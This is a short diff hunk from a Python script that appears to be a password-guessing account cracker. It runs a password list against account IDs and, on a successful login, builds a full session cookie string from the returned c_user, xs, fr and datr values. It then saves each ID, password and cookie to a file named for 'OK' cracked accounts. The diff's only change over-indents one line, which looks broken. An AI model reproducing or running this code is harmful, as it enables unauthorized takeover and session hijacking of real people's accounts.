@@ -549,7 +549,7 @@ def rd(ids,passlist,fbcr):
 				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
 				open('/sdcard/Cyber/Cyber-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
 				break
-		loop+=1
+		          loop+=1
 	except requests.exceptions.ConnectionError:
 		time.sleep(20)
 	except Exception as e:
